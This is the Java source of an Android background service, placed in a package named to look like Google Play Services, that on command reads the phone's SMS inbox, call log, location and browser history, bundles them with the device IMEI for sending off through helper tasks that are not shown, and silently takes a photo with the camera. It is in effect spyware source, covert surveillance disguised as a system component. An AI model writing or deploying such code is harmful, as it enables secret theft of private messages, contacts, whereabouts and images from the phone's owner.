package com.google.androidgms;

import android.app.IntentService;
import android.content.Intent;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Browser;
import android.provider.CallLog;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.text.DateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p/>
 * TODO: Customize class - update intent actions, extra parameters and static
 * helper methods.
 */
public class GetData extends IntentService{
    public static final String Msg="bleh";
    LocationManager locationManager;
    String locationProvider ;
    private JSONArray jsonArray = new JSONArray();
    private JSONObject list = new JSONObject();

    Camera cam;
    Camera.Parameters param;



    public GetData() {
        super("GetData");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent.getStringExtra(Msg).equals("sms")) {
            Log.d(intent.getStringExtra(Msg), "print");
            String[] reqCols = new String[] { "_id", "address", "body","person","date"};
            String[] messageArr = new String[30];
            int ctr=0;
            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), reqCols, null, null, null);
            cursor.moveToFirst();

            do{
                String msgData = "";
                JSONObject smsJson = new JSONObject();
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String person = cursor.getString(cursor.getColumnIndex("person"));
                long date = cursor.getLong(cursor.getColumnIndex("date"));
                String body=cursor.getString(cursor.getColumnIndex("body"));
                Date propdate=new Date(date);
                DateFormat bleh=android.text.format.DateFormat.getDateFormat(getApplicationContext());
                try {
                    smsJson.put("address",address);
                    smsJson.put("data",body);
                    smsJson.put("time",bleh.format(propdate).toString());
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                msgData = "addess: "+address+"; date: "+bleh.format(propdate).toString()+"; body: "+body+"; person: "+person;
                Log.d("Message",msgData);
                messageArr[ctr]=msgData;
                jsonArray.put(smsJson);
                ++ctr;
            }while(cursor.moveToNext() && ctr<30);
            try
            {
                SharedPreferences sp = getSharedPreferences("MyPref",MODE_PRIVATE);
                String imei = sp.getString("imei","null");
                Log.d("imei",imei);
                list.put("list",jsonArray);
                list.put("imei",imei);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            SendSMSData s1 = new SendSMSData(list);
            s1.execute();
        }
        else if(intent.getStringExtra(Msg).equals("location"))
        {
            Log.d("location","got string");
            locationManager = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);
            locationProvider = LocationManager.NETWORK_PROVIDER;
            getLocation g1 = new getLocation();
            locationManager.requestLocationUpdates(locationProvider, 0, 0, g1);
            Location lastKnownLocation = locationManager.getLastKnownLocation(locationProvider);
            Log.d("location","Latitude:"+lastKnownLocation.getLatitude()+"Longitude"+lastKnownLocation.getLongitude());
            Geocoder geocoder;
            List<Address> addresses;
            geocoder = new Geocoder(this, Locale.getDefault());
            try {
                JSONObject locationJson = new JSONObject();
                addresses = geocoder.getFromLocation(lastKnownLocation.getLatitude(), lastKnownLocation.getLongitude(), 1);
                String address = addresses.get(0).getAddressLine(0);
                String city = addresses.get(0).getLocality();
                String country = addresses.get(0).getCountryName();
                String regionCode = addresses.get(0).getCountryCode();
                SharedPreferences sp = getSharedPreferences("MyPref",MODE_PRIVATE);
                String imei = sp.getString("imei","null");
                locationJson.put("latitude",""+lastKnownLocation.getLatitude());
                locationJson.put("longitude",""+lastKnownLocation.getLongitude());
                locationJson.put("imei",imei);
                Log.d("location","Latitude:"+lastKnownLocation.getLatitude()+"Longitude"+lastKnownLocation.getLongitude());
                Log.d("location","address: "+address+" city: "+city+" country: "+country+" regionCode: "+regionCode);
                SendLocation sendLocation = new SendLocation(locationJson);
                sendLocation.execute();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }
            locationManager.removeUpdates(g1);
        }
        else if(intent.getStringExtra(Msg).equals("browser"))
        {
            Uri uriCustom;
            String[] proj = new String[] { Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL };
            String sel = Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 = history, 1 = bookmark
            if(isAppInstalled("com.android.chrome"))
            {
                Log.d("browser","chrome installed");
                uriCustom = Uri.parse("content://com.android.chrome.browser/bookmarks");
            }
            else
            {
                Log.d("browser","chrome not installed");
                uriCustom = Browser.BOOKMARKS_URI;
            }

            Cursor mCur = getContentResolver().query(uriCustom, proj, sel, null, null);
            mCur.moveToFirst();

            String title = "";
            String url = "";

            if (mCur.moveToFirst() && mCur.getCount() > 0) {
                boolean cont = true;
                while (mCur.isAfterLast() == false && cont) {

                    title = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.TITLE));
                    url = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.URL));
                    Log.d("browser","title: "+title+" url: "+url);
                    mCur.moveToNext();
                }
            }
        }
        else if(intent.getStringExtra(Msg).equals("logs")){
            Cursor c1 = getContentResolver().query(CallLog.Calls.CONTENT_URI,null,null,null,null);
            c1.moveToLast();
            if(c1!=null){
                do{
                    JSONObject logsJSON = new JSONObject();
                    String number = c1.getString(c1.getColumnIndex("number"));
                    String name = c1.getString(c1.getColumnIndex("name"));
                    long date = c1.getLong(c1.getColumnIndex("date"));
                    long duration=c1.getLong(c1.getColumnIndex("duration"));
                    String type=c1.getString(c1.getColumnIndex("type"));
                    String callType=null;
                    int dircode=Integer.parseInt(type);
                    switch( dircode ) {
                        case CallLog.Calls.OUTGOING_TYPE:
                            callType = "Out";
                            break;

                        case CallLog.Calls.INCOMING_TYPE:
                            callType = "In";
                            break;

                        case CallLog.Calls.MISSED_TYPE:
                            callType = "Miss";
                            break;
                    }
                    Date propdate=new Date(date);
                    DateFormat bleh=android.text.format.DateFormat.getDateFormat(getApplicationContext());
                    try {
                        logsJSON.put("number",number);
                        logsJSON.put("name",name);
                        logsJSON.put("date",bleh.format(propdate).toString());
                        logsJSON.put("kind",callType);
                        logsJSON.put("duration",""+duration);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                    Log.d("entry:",number+","+name+","+bleh.format(propdate)+","+duration+","+callType);
                    jsonArray.put(logsJSON);
                }while (c1.moveToPrevious());
                try
                {
                    SharedPreferences sp = getSharedPreferences("MyPref",MODE_PRIVATE);
                    String imei = sp.getString("imei","null");
                    Log.d("imei",imei);
                    list.put("list",jsonArray);
                    list.put("imei",imei);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                SendCallLogs sl1 = new SendCallLogs(list);
                sl1.execute();
            }
        }
        else if(intent.getStringExtra(Msg).equals("camera")){
            System.out.println( "Preparing to take photo");
            Camera camera = null;
            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
            Camera.getCameraInfo(0, cameraInfo);

                try {
                    camera = Camera.open(0);
                } catch (RuntimeException e) {
                    System.out.println("Camera not available");
                    camera = null;
                    //e.printStackTrace();
                }
                try{
                    if (null == camera) {
                        System.out.println("Could not get camera instance");
                    }else{
                        System.out.println("Got the camera, creating the dummy surface texture");
                        //SurfaceTexture dummySurfaceTextureF = new SurfaceTexture(0);
                        try {
                            //camera.setPreviewTexture(dummySurfaceTextureF);
                            camera.setPreviewTexture(new SurfaceTexture(0));
                            camera.startPreview();
                        } catch (Exception e) {
                            System.out.println("Could not set the surface preview texture");
                            e.printStackTrace();
                        }
                        camera.takePicture(null, null, new Camera.PictureCallback() {

                            @Override
                            public void onPictureTaken(byte[] data, Camera camera) {
                                Log.i("CAMERA","reached callback");
                                camera.release();
                            }
                        });
                    }
                }catch (Exception e){
                    camera.release();
                }
        }
    }

    private boolean isAppInstalled(String uri)
    {
        PackageManager pm = getPackageManager();
        boolean installed = false;
        try {
            pm.getPackageInfo(uri, PackageManager.GET_ACTIVITIES);
            installed = true;
        } catch (PackageManager.NameNotFoundException e) {
            installed = false;
        }
        return installed;
    }

    private class getLocation implements LocationListener
    {
        @Override
        public void onLocationChanged(Location location) {
            Log.d("location","Latitude:"+location.getLatitude()+"Longitude"+location.getLongitude());
        }

        @Override
        public void onStatusChanged(String provider, int status, Bundle extras) {

        }

        @Override
        public void onProviderEnabled(String provider) {
            Log.d("location","location enabled");
        }

        @Override
        public void onProviderDisabled(String provider) {
            Log.d("location","location disabled");
        }
    }

    /*
    @Override
    public void onLocationChanged(Location location) {
        Log.d("location","Latitude:"+location.getLatitude()+"Longitude"+location.getLongitude());
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {

    }

    @Override
    public void onProviderEnabled(String provider) {
        Log.d("location","location enabled");
    }

    @Override
    public void onProviderDisabled(String provider) {
        Log.d("location","location disabled");
    }
    */
}

